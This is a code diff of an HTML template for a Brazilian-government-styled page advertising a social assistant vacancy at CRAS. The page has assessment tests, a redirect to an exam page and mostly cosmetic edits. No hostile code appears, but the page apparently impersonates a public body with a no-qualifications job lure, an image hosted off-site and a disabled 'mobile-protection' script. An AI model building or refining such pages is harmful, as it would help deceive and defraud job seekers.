@@ -39,20 +39,33 @@
             font-size: 16px;
             color: #555;
             line-height: 1.5;
-            margin: 0;
-            padding: 0;
+            overflow-x: hidden;
         }
 
+        /* Consistent Font Weight for Bold Elements */
         strong, .font-bold {
           font-weight: 500 !important;
         }
 
+        /* Standard Text Sizes and Colors */
         .text-base {
           font-size: 16px;
           color: #555;
           line-height: 1.5;
         }
+
+        /* Footer width fix */
+        footer {
+          width: 100% !important;
+          max-width: none !important;
+          margin: 0 !important;
+          padding-left: 0 !important;
+          padding-right: 0 !important;
+        }
     </style>
+    
+    <!-- Mobile Protection disabled for testing -->
+    <!-- <script src="{{ url_for('static', filename='mobile-protection.js') }}"></script> -->
 </head>
 <body>
     <!-- Government Header -->
@@ -63,9 +76,15 @@
             </a>
             <nav>
                 <ul class="flex space-x-4 text-[10px]">
-                    <li><a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a></li>
-                    <li><a class="hover:underline" href="#">PARTICIPE</a></li>
-                    <li><a class="hover:underline" href="#">SERVIÇOS</a></li>
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
                 </ul>
             </nav>
         </div>
@@ -77,41 +96,16 @@
             <img src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" alt="Logo CRAS" class="h-8 mx-auto" />
         </div>
     </div>
-
-    <!-- Breadcrumb -->
-    <div class="bg-gray-100 py-3">
-        <div class="container mx-auto px-4">
-            <nav class="text-sm text-gray-600">
-                <a href="/" class="hover:text-blue-600">Início</a>
-                <span class="mx-2">></span>
-                <a href="/vagas" class="hover:text-blue-600">Vagas</a>
-                <span class="mx-2">></span>
-                <a href="/local" class="hover:text-blue-600">Localização</a>
-                <span class="mx-2">></span>
-                <a href="/address" class="hover:text-blue-600">Endereço</a>
-                <span class="mx-2">></span>
-                <span class="text-gray-800">Informações da Vaga</span>
-            </nav>
-        </div>
-    </div>
-
-    <!-- Main Content -->
-    <main class="container mx-auto px-4 py-8 max-w-4xl">
-        <!-- Progress Bar -->
-        <div class="mb-8">
-            <div class="flex justify-between items-center mb-2">
-                <span class="text-sm font-medium text-gray-700">Progresso do Cadastro</span>
-                <span class="text-sm font-medium text-gray-700">60%</span>
-            </div>
-            <div class="w-full bg-gray-200 rounded-full h-2">
-                <div class="bg-[#044785] h-2 rounded-full" style="width: 60%"></div>
-            </div>
-        </div>
-
+    <br>
+    <br>
         <!-- Page Header -->
         <div class="text-center mb-8">
-            <h1 class="text-3xl font-bold text-gray-800 mb-4">Oportunidade Única no CRAS</h1>
-            <p class="text-lg text-gray-600">Conheça os detalhes da vaga de Assistente Social</p>
+            <h1 class="text-3xl font-bold text-gray-800 mb-4">
+                Oportunidade Única no CRAS
+            </h1>
+            <p class="text-lg text-gray-600">
+                Conheça os detalhes da vaga de Assistente Social
+            </p>
         </div>
 
         <!-- Main Content Card -->
@@ -177,15 +171,6 @@
                             </ul>
                         </div>
                         <div>
-                            <h3 class="font-semibold text-gray-800 mb-3">❌ O que NÃO é exigido:</h3>
-                            <ul class="text-gray-700 space-y-2">
-                                <li><i class="fas fa-times text-red-500 mr-2"></i>Curso superior em Serviço Social</li>
-                                <li><i class="fas fa-times text-red-500 mr-2"></i>Experiência prévia na área</li>
-                                <li><i class="fas fa-times text-red-500 mr-2"></i>Formação específica</li>
-                                <li><i class="fas fa-times text-red-500 mr-2"></i>Certificações profissionais</li>
-                            </ul>
-                        </div>
-                    </div>
                     <div class="mt-4 p-4 bg-yellow-50 border-l-4 border-yellow-400">
                         <p class="text-yellow-800">
                             <strong>Importante:</strong> O CRAS oferecerá toda a capacitação necessária para que você possa exercer a função com excelência.
@@ -193,7 +178,7 @@
                     </div>
                 </div>
             </div>
-
+<br>
             <!-- Assessment Process -->
             <div class="mb-8">
                 <h2 class="text-2xl font-semibold text-gray-800 mb-4">
@@ -207,7 +192,6 @@
                     <div class="grid md:grid-cols-2 gap-4 mb-4">
                         <div class="bg-white p-4 rounded-lg border border-blue-200">
                             <h4 class="font-semibold text-blue-800 mb-2">
-                                <i class="fas fa-heart text-red-500 mr-2"></i>
                                 Teste 1: Inteligência Emocional
                             </h4>
                             <p class="text-blue-700 text-sm">
@@ -216,7 +200,6 @@
                         </div>
                         <div class="bg-white p-4 rounded-lg border border-blue-200">
                             <h4 class="font-semibold text-blue-800 mb-2">
-                                <i class="fas fa-brain text-purple-500 mr-2"></i>
                                 Teste 2: Avaliação Psicotécnica
                             </h4>
                             <p class="text-blue-700 text-sm">
@@ -247,7 +230,7 @@
     </main>
 
     <!-- Footer -->
-    <footer class="bg-[#044785] text-white py-8 md:py-12 w-full">
+    <footer class="bg-[#044785] text-white py-8 md:py-12" style="width: 100%; margin: 0; padding-left: 0; padding-right: 0;">
         <div class="container mx-auto px-4 max-w-6xl">
             <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
                 <div>
@@ -320,12 +303,14 @@
         function startAssessment() {
             console.log('startAssessment function called');
             try {
+                // Show loading state
                 const button = document.querySelector('button[onclick="startAssessment()"]');
                 if (button) {
                     const originalText = button.innerHTML;
                     button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Preparando testes...';
                     button.disabled = true;
                     
+                    // Simulate preparation time
                     setTimeout(() => {
                         console.log('Redirecting to /exame');
                         window.location.href = '/exame';
@@ -340,7 +325,9 @@
             }
         }
 
+        // Save form progress
         document.addEventListener('DOMContentLoaded', function() {
+            // Mark this step as completed
             localStorage.setItem('infoPageCompleted', 'true');
             console.log('Info page accessed - marking as completed');
         });
